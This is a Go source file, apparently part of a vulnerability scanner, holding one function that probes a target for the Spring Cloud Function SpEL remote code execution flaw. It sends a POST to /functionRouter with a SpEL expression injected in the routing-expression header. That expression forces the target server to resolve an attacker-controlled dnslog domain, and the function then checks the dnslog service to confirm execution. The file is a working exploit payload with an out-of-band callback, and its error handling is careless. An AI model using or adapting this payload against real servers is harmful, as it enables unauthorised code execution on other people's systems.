package lib

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
)

func SpringElRce(url string, wg *sync.WaitGroup) {
	defer wg.Done()

	cookie, dnslog := GetDnslog()
	fmt.Println(Green("[+] dnslog获取成功 :" + dnslog))
	client := &http.Client{}

	req, err := http.NewRequest("POST", url+"/functionRouter", strings.NewReader("helloworld=12345678"))
	if err != nil {
		// handle error
	}
	req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	req.Header["spring.cloud.function.routing-expression"] = []string{"T(java.net.InetAddress).getByName(\"" + "SpringCloudFunctionSpELRce." + dnslog + "\")"}
	resp, err := client.Do(req)
	defer resp.Body.Close()
	res := GetDnsResult(cookie)
	res1 := strings.Contains(res, "SpringCloudFunctionSpELRce")
	if res1 {
		fmt.Println(Green("[+] SpringCloudFunctionSpELRce 存在！"))
	} else {
		fmt.Println(Red("[-] SpringCloudFunctionSpELRce 不存在"))
	}

}
